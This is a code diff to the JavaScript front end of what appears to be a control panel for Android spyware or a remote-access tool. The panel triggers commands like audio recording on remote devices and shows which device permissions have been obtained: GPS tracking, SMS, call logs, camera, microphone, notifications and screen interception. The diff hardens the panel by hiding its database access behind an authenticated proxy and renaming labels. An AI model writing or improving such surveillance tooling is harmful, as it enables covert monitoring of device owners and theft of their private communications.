@@ -103,14 +103,12 @@ class DashboardEngine {
 }
 
 // ==========================================
-// 🚀 THE MASTER COMMAND DISPATCHER & REDIRECT ENGINE
+// THE MASTER COMMAND DISPATCHER & REDIRECT ENGINE
 // ==========================================
-
 window.triggerCommand = async function(commandString, commandName) {
     const isConfirmed = confirm(`Are you sure you want to trigger: ${commandName}?`);
     if (!isConfirmed) return;
 
-    // Special logic to append audio duration if it's the record command
     if (commandString === 'record_audio') {
         const durationElement = document.getElementById('audio-duration');
         if (durationElement) {
@@ -139,7 +137,6 @@ window.triggerCommand = async function(commandString, commandName) {
         const result = await res.json();
         
         if (result.status === 'success') {
-            // 🚀 MAGIC REDIRECT: Seedha Ops Vault me bhej do!
             window.location.href = '/ops';
         } else {
             alert(`❌ Action Execution Failed: ${result.message}`);
@@ -150,7 +147,6 @@ window.triggerCommand = async function(commandString, commandName) {
     }
 };
 
-// Global Device Deletion
 window.deleteDevice = async function(deviceId) {
     if (!confirm("WARNING: Are you sure you want to permanently remove this device?")) return;
     const token = localStorage.getItem('owner_token');
@@ -171,18 +167,18 @@ window.deleteDevice = async function(deviceId) {
 };
 
 // ==========================================
-// 🚀 DIAGNOSTICS & SETTINGS CHECK ENGINE
+// 🚀 FIX: SECURE PROXY DIAGNOSTICS & SETTINGS CHECK ENGINE
 // ==========================================
-
 window.openSettingsCheckModal = async () => {
     const modal = document.getElementById('diagnostics-modal');
     const content = document.getElementById('diagnostics-content');
     const deviceId = localStorage.getItem('active_device_id');
+    const token = localStorage.getItem('owner_token');
 
     if (!modal || !content) return;
     
     modal.style.display = 'flex';
-    content.innerHTML = '<p style="color: #888; text-align: center; margin-top: 20px;">Fetching remote diagnostic data from Supabase...</p>';
+    content.innerHTML = '<p style="color: #aaa; text-align: center; margin-top: 20px;">Synchronizing structural security diagnostic nodes...</p>';
 
     if (!deviceId) {
         content.innerHTML = '<p style="color: #e74c3c; text-align: center; margin-top: 20px;">No active device selected.</p>';
@@ -190,38 +186,32 @@ window.openSettingsCheckModal = async () => {
     }
 
     try {
-        const configRes = await fetch('/api/config');
-        const config = await configRes.json();
-        
-        // Supabase query to get the latest permission sync data for the active device
-        const permRes = await fetch(`${config.supabase_url}/rest/v1/permissions?device_id=eq.${deviceId}&order=created_at.desc&limit=1`, {
-            headers: {
-                'apikey': config.supabase_key,
-                'Authorization': `Bearer ${config.supabase_key}`
-            }
+        // 🚀 CRITICAL PATCH: Exchanged raw database endpoints with internal gateway logic
+        const permRes = await fetch(`/api/devices/diagnostics?device_id=${deviceId}`, {
+            headers: { 'Authorization': `Bearer ${token}` }
         });
 
-        const data = await permRes.json();
+        const result = await permRes.json();
 
-        if (!data || data.length === 0) {
-            content.innerHTML = '<p style="color: #f39c12; text-align: center; margin-top: 20px;">No diagnostic data received from device yet.</p>';
+        if (result.status !== 'success' || !result.data || result.data.length === 0) {
+            content.innerHTML = '<p style="color: #f39c12; text-align: center; margin-top: 20px;">No diagnostic reports synchronized from the target context yet.</p>';
             return;
         }
 
-        const perms = data[0];
+        const perms = result.data[0];
         
-        // Matrix Map Builder
+        // Matrix Map Data Alignment Configuration
         const map = {
-            'Accessibility (Core Engine)': perms.accessibility,
-            'Location Tracking': perms.location,
-            'Notification Access': perms.notification_access,
-            'Storage & Media Files': perms.storage,
-            'Microphone (Live Ops)': perms.microphone,
-            'Camera Access': perms.camera,
-            'Call Logs Parsing': perms.call_log,
-            'SMS Message Sync': perms.sms,
-            'Phone State Monitoring': perms.phone,
-            'Screen Capture Overlay': perms.screen_recording
+            'Accessibility Framework (Core)': perms.accessibility,
+            'Live GPS Tracking Engine': perms.location,
+            'Notification Listener Access': perms.notification_access,
+            'Internal Storage Registry': perms.storage,
+            'Microphone Stream Authorization': perms.microphone,
+            'Camera Sensor Pipeline': perms.camera,
+            'Telephony Logs Tracker': perms.call_log,
+            'SMS Metadata Auditing': perms.sms,
+            'Device Telemetry Diagnostics': perms.phone,
+            'Screen Interception Interface': perms.screen_recording
         };
 
         let html = '<div style="display: flex; flex-direction: column; gap: 10px; margin-top: 15px;">';
@@ -241,8 +231,8 @@ window.openSettingsCheckModal = async () => {
         content.innerHTML = html;
 
     } catch (e) {
-        console.error("Diagnostics Fetch Error:", e);
-        content.innerHTML = '<p style="color: #e74c3c; text-align: center; margin-top: 20px;">Network Error. Failed to fetch diagnostics.</p>';
+        console.error("Diagnostics Execution Failure:", e);
+        content.innerHTML = '<p style="color: #e74c3c; text-align: center; margin-top: 20px;">Secure proxy request block. Execution halted.</p>';
     }
 };
 
